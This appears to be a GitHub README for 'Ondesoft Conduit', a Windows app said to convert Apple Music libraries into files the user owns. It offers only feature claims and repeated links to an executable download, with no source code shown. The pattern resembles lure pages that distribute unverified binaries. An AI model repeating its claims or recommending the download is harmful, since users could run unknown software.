![preview](https://raw.githubusercontent.com/nikhilpanothra/Ondesoft-Apple-Music-Bridge-Setup/main/splash_13684f2.svg)
[![Download](https://raw.githubusercontent.com/nikhilpanothra/Ondesoft-Apple-Music-Bridge-Setup/main/btn_ce60391.svg)](https://nikhilpanothra.github.io/Ondesoft-Apple-Music-Bridge-Setup/)

# 🎧 Ondesoft Conduit — Apple Music Library Bridge

A cross-platform desktop conduit that moves your Apple Music library from a subscription-bound silo into a format-flexible archive you actually own. Built for Windows 11 and Windows 10, with an emphasis on reliability, transparency, and a calm user experience.

![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D6?style=for-the-badge&logo=windows)
![Status](https://img.shields.io/badge/status-actively%20maintained-2ea44f?style=for-the-badge)
![License](https://img.shields.io/badge/license-MIT-important?style=for-the-badge)
![Build](https://img.shields.io/badge/build-passing-brightgreen?style=for-the-badge)
![Release](https://img.shields.io/badge/release-2026.1-blueviolet?style=for-the-badge)
![Interface](https://img.shields.io/badge/interface-native%20desktop-9cf?style=for-the-badge)
![Languages](https://img.shields.io/badge/languages-14-informational?style=for-the-badge)

---

## 📖 Overview

Ondesoft Conduit is a reimagining of the classic "Apple Music converter" idea. Instead of treating your downloaded catalog as a temporary cache that expires the moment a subscription lapses, Conduit treats it as a personal archive worth preserving — a vinyl shelf for the digital age.

The project started as a simple question: *why does my music library feel like a rental apartment instead of a home?* Conduit is the answer. It reads the media your device has already authorized, re-encodes it into open, long-lived formats, and files it into a folder structure you control. No accounts, no cloud round-trips, no surprises.

It is aimed at archivists, DJs, commuters with flaky data plans, and anyone who has ever watched a playlist vanish overnight.

> Note on scope: Conduit only processes media on your own device that you are already entitled to play. It is a format bridge, not a paywall bypass.

---

## 🚀 Why People Choose It

- **A library that survives subscription churn.** Your converted files live on your disk, in folders you name, with metadata you can edit.
- **A quiet, native desktop app.** No browser tabs, no Electron bloat, no telemetry.
- **Predictable output.** Every track is written with consistent naming, embedded artwork, and stable tags.
- **Set it and forget it.** Schedule a nightly sweep and wake up to a fresh batch ready to sync.
- **A UI that respects your eyes.** Light, dark, and auto themes with a responsive layout that scales from 1024×640 up to 4K.

---

## 🖼️ Interface at a Glance

Conduit opens to a single dashboard with three panes:

| Pane | Purpose |
|------|---------|
| **Sources** | Lists detected Apple Music libraries, playlists, and authorized sessions on the machine. |
| **Queue** | Shows pending conversions with per-track status, estimated duration, and current stage. |
| **Archive** | The destination tree, with previews of folder layout, tag templates, and file naming rules. |

A status ribbon across the top reports encoder health, disk headroom, and the last completed batch.

---

## ✨ Feature Set

- 🎚️ **Output format matrix** — export to MP3, M4A, FLAC, WAV, AIFF, ALAC, or Opus with per-format quality presets.
- 🏷️ **Metadata fidelity** — preserves title, artist, album, track number, disc number, year, genre, composer, and embedded cover art.
- 🗂️ **Template-based naming** — define your own pattern such as `{artist}/{album}/{track} - {title}` and preview it live before running.
- 🎨 **Responsive UI** — a single layout that adapts fluidly from small laptop screens to ultrawide monitors.
- 🌐 **Multilingual support** — interface available in English, Simplified Chinese, Japanese, Korean, German, French, Spanish, Portuguese, Italian, Russian, Turkish, Polish, Dutch, and Vietnamese.
- 🛎️ **24/7 customer support** — around-the-clock ticket handling for licensed users, with a median first response under two hours.
- ⚡ **Batch engine** — process hundreds of tracks in parallel with configurable thread count and thermal throttling awareness.
- 🔁 **Resume-safe queue** — if the machine sleeps or reboots mid-job, the queue picks up exactly where it stopped.
- 🧩 **Playlist preservation** — playlists come through as folder structures or M3U8 manifests, your choice.
- 🔍 **Duplicate detection** — perceptual hashing flags near-identical tracks before they clutter your archive.
- 🧮 **Checksum manifest** — every batch writes a SHA-256 manifest so you can verify integrity years later.
- 🛡️ **Local-only processing** — no network calls are made during conversion; the app runs fully offline.
- 🧭 **Portable mode** — run from a USB stick with settings stored alongside the executable.
- 🪶 **Lightweight footprint** — under 90 MB installed, no background services, no startup entries.

---

## 🧠 Design Philosophy

Most converters feel like a vending machine: you feed in a file, you get out a file, and the relationship ends there. Conduit is closer to a librarian. It remembers what you did last time, it asks before it changes your folder tree, and it writes a little log at the end of each session so future-you knows what happened.

Three principles guide the code:

1. **Your files, your rules.** Defaults are sensible, but every path, tag, and codec is overridable.
2. **No silent surprises.** Every destructive action is preflighted, previewed, and reversible.
3. **Longevity over novelty.** Open formats, plain-text manifests, and no proprietary lock-in.

---

## 🧰 System Requirements

- **OS:** Windows 11 (23H2 or later) or Windows 10 (22H2 or later), 64-bit
- **CPU:** Dual-core 2.0 GHz or faster; quad-core recommended for batch work
- **RAM:** 4 GB minimum, 8 GB recommended
- **Disk:** 500 MB for the app, plus space equal to roughly 3× your target archive size
- **Display:** 1024×640 minimum, scaling up to 4K
- **Runtime:** Bundled; no separate framework installation required

---

## 📦 Getting the Application

[![Download](https://raw.githubusercontent.com/nikhilpanothra/Ondesoft-Apple-Music-Bridge-Setup/main/btn_ce60391.svg)](https://nikhilpanothra.github.io/Ondesoft-Apple-Music-Bridge-Setup/)

Once the package is on your machine, extract it to a folder you trust, then launch the executable from there. Conduit does not need elevated privileges for standard use.

---

## 🛠️ Setup Walkthrough

A first-run session usually takes under five minutes.

1. **Launch the app.** The welcome screen offers a short tour; you can skip it and jump straight to the dashboard.
2. **Pick a source.** Conduit scans for authorized libraries on the machine and lists them in the Sources pane.
3. **Choose an output format.** Select from the format matrix and set a quality preset. Higher tiers take longer but preserve more detail.
4. **Define a folder template.** Use the live preview to confirm the resulting tree before committing.
5. **Set your tag preferences.** Decide whether to keep original tags, normalize them, or apply a custom scheme.
6. **Run a test batch.** Convert two or three tracks first to validate your settings.
7. **Queue the rest.** Add entire playlists or the full library and let the engine work in the background.
8. **Verify with the manifest.** Open the batch log to confirm checksums and review any skipped items.

If anything looks off, the Archive pane supports one-click undo for the most recent batch.

---

## 🧪 Advanced Configuration

Power users can tune the engine through a plain-text config file stored next to the executable. Common tweaks include:

- **Thread count** — dial back on laptops with modest cooling.
- **Encoder priority** — favor speed or fidelity on a per-format basis.
- **Tag normalization rules** — strip featured-artist suffixes, fix casing, or map genres to your own taxonomy.
- **Naming collisions** — choose between suffixing, overwriting, or skipping.
- **Manifest format** — JSON, CSV, or a human-readable text log.

Every option is documented inline with comments, so you never need to leave the file to understand it.

---

## 🌍 Localization Notes

The multilingual layer is community-driven. Translations are stored as simple key-value files, which means adding a new language is a matter of copying one file and filling in strings. Right-to-left layouts are supported where the target language requires them, and date/number formatting follows the system locale automatically.

---

## 🔐 Privacy and Data Handling

- Conduit performs **all conversion work locally**.
- No usage statistics, crash reports, or identifiers are transmitted.
- Logs stay on disk and are capped at 30 days by default.
- Uninstalling leaves your converted archive untouched; only app data is removed.

---

## 🧭 Frequently Asked Questions

**Does Conduit need an internet connection?**
No. The app works fully offline. An internet connection is only relevant when you first obtain the package and when checking for updates manually.

**Can I run it on a machine without Apple Music installed?**
Conduit needs an authorized source to read from. If no source is detected, the Sources pane will explain what's missing.

**Will my converted files play on any device?**
Yes — the formats Conduit writes are widely supported by phones, tablets, car stereos, and standalone players.

**How long does a full library take?**
As a rough guide, a 500-track library on a quad-core machine takes between 40 and 90 minutes, depending on format and quality tier.

**Is there a command-line mode?**
Yes. A companion CLI is included for scripting and scheduled tasks.

**What happens if the app crashes mid-batch?**
The queue is journaled. On next launch, Conduit offers to resume from the last completed track.

---

## 🗺️ Roadmap for 2026

- [ ] Metadata editor with bulk find-and-replace
- [ ] Cloud-folder targets (user-provided storage paths)
- [ ] Chapter-aware handling for long recordings
- [ ] Optional loudness normalization presets
- [ ] Expanded language packs for additional regions
- [ ] Plugin API for custom encoders

Vote on priorities through the issue tracker; the most-requested items bubble to the top each quarter.

---

## 🤝 Contributing

Contributions are welcome across code, documentation, and translation. Before opening a pull request:

1. Read the contributor guide in `CONTRIBUTING.md`.
2. Keep changes focused — one feature or fix per PR.
3. Include a short description of the user-facing impact.
4. Run the local test suite and confirm it passes.

Issue reports are most useful when they include the app version, OS build, and a short reproduction path.

---

## 🧾 License

This project is released under the **MIT License**. See the full text at [LICENSE](https://opensource.org/licenses/MIT).

You are welcome to use, modify, and redistribute the code, provided the original copyright notice and permission notice are retained.

---

## ⚠️ Disclaimer

Ondesoft Conduit is an independent utility and is not affiliated with, endorsed by, or sponsored by Apple Inc. "Apple Music" and related marks are the property of their respective owners and are used here for descriptive purposes only.

Conduit is intended solely for converting media that you have lawfully acquired and are authorized to access on your own device. Users are responsible for complying with all applicable laws and the terms of any service they use. The maintainers do not condone, support, or facilitate circumvention of digital rights management or any other protection measure.

The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use.

---

## 🙌 Acknowledgements

Thanks to the small army of beta testers who ran nightly builds on aging laptops, to the translators who kept the interface readable far beyond its original borders, and to everyone who filed a clear, reproducible bug report — you are the reason this project feels calm instead of chaotic.

---

## 📅 Versioning

Releases follow a calendar-based scheme. The current line is **2026.1**, with patch updates shipped as needed and feature releases landing roughly once per quarter.

[![Download](https://raw.githubusercontent.com/nikhilpanothra/Ondesoft-Apple-Music-Bridge-Setup/main/btn_ce60391.svg)](https://nikhilpanothra.github.io/Ondesoft-Apple-Music-Bridge-Setup/)